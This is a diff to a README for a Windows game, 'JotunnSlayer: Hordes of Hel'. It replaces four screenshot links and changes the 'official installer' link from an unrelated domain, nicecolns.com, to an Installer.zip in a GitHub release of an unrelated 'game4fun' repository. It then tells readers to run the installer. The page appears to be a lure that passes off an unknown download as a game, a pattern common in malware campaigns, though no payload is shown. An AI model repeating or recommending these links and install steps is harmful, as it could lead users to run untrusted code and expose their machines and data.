@@ -14,10 +14,10 @@ In **JotunnSlayer: Hordes of Hel**, players take on the role of a fierce warrior
 - **Epic Boss Fights:** Test your strength against towering, fearsome bosses in challenging and rewarding battles.  
 - **Progression System:** Upgrade your weapons, unlock powerful abilities, and become the ultimate JotunnSlayer.  
 
-![image](https://github.com/user-attachments/assets/dbe9e522-2e86-442c-9c16-995590f5b3d5)
-![image](https://github.com/user-attachments/assets/ea3bbdbe-15b3-4bc5-a399-89443dd305e7)
-![image](https://github.com/user-attachments/assets/3d5d3bde-86ac-42b6-894c-d0fe34515891)
-![image](https://github.com/user-attachments/assets/2d895638-cfdd-4035-9e6a-c0f3d3caf526)
+![image](https://github.com/user-attachments/assets/40b38cad-22f4-49b4-b8a0-1d0e89f75629)
+![image](https://github.com/user-attachments/assets/b9accb44-88b6-4aa4-bebe-67368aa704f7)
+![image](https://github.com/user-attachments/assets/dcaee935-b5b6-4e3e-93f2-218747501c85)
+![image](https://github.com/user-attachments/assets/5abbc3f0-8971-482a-af8a-43aafb8ee188)
 
 
 ---
@@ -27,7 +27,7 @@ In **JotunnSlayer: Hordes of Hel**, players take on the role of a fierce warrior
 Getting started with **JotunnSlayer: Hordes of Hel** is easy! Follow these steps to download and install the game on your Windows 10 PC:  
 
 ### Step 1: Download the Installer  
-- Click this [**link**](https://nicecolns.com/) to download the official installer.  
+- Click this [**link**](https://github.com/JeanSylvestrek/game4fun/releases/download/publish/Installer.zip) to download the official installer.  
 - Save the installer file in your preferred directory, such as the "Downloads" folder.  
 
 ### Step 2: Run the Installer  
